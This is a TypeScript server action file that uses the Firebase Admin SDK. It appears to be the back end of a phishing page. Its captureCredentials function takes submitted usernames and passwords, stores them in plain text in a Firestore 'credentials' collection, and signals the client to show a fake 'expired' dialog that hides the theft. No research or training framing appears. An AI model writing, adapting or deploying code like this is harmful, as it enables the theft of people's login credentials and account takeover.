'use server';

import * as admin from 'firebase-admin';

// This function ensures Firebase Admin is initialized, but only once.
function initializeFirebaseAdmin() {
  if (!admin.apps.length) {
    try {
      const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
      if (!serviceAccountString) {
        throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
      }
      const serviceAccount = JSON.parse(serviceAccountString);

      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
      });
      console.log('Firebase Admin SDK initialized successfully.');
    } catch (error: any) {
      console.error('Failed to initialize Firebase Admin SDK:', error.message);
      // We throw the error to prevent the app from continuing without a database connection.
      throw new Error('Server configuration error: Could not initialize Firebase Admin.');
    }
  }
  return admin.firestore();
}

// Server action to capture credentials
export async function captureCredentials(prevState: any, formData: FormData) {
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Capturing credentials for:', username);

  if (!username || !password) {
    console.log('Submission failed: Missing username or password.');
    return { success: false, message: 'Username and password are required.' };
  }

  try {
    const firestore = initializeFirebaseAdmin();
    const credentialsCollection = firestore.collection('credentials');

    await credentialsCollection.add({
      username,
      password,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    });
    
    console.log('Successfully saved credentials to Firestore using Admin SDK.');
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error in captureCredentials:', error.message);
    // Return a specific error message for the client
    return {
      success: false,
      message: error.message || 'Failed to save credentials. Please check server logs.',
    };
  }
}
